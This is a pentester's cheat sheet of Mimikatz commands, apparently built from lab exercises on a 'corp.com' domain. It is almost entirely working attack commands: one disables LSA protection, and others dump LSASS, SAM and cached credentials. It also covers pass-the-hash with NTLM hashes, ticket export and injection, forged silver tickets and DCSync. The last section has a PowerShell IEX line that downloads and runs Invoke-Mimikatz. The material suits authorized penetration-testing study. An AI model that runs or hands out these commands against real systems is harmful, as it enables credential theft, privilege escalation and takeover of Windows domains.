https://tools.thehacker.recipes/mimikatz
## steps that must be checked
```shell
privilege::debug
token::elevate
```
## credentials
```shell
# disable LSA protection on newer version of Windows and reboot in order to dump lsass memory
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

```shell
lsadump::sam
lsadump::cache
sekurlsa::logonpasswords
```

## overpass the hash
```shell
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

## pass the ticket
```shell
# export tickets
kerberos::list /export
sekurlsa::tickets /export

# import tickets
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi # the corresponding ticket would only show under the context who injected the silver ticket. (context: system, administrator, normal user ...)
```

## silver tickets
```shell
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
exit

klist # the corresponding ticket would only show under the context who crafted and injected the silver ticket. (context: system, administrator, normal user ...)
```

## dcsync
```shell
lsadump::dcsync
```
## get DPAPI masterkey
```shell
dpapi::masterkey /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\<sid>/<masterkey>" /password:"password" /protected

sekurlsa::dpapi
```

## use input parameter
```shell
./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"         # for evil-winrm ( not an interactive shell)
```

## Invoke-Mimikatz.ps1
```shell
IEX (New-Object System.Net.Webclient).DownloadString('URL/')
Invoke-Mimikatz -DumpCreds # Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```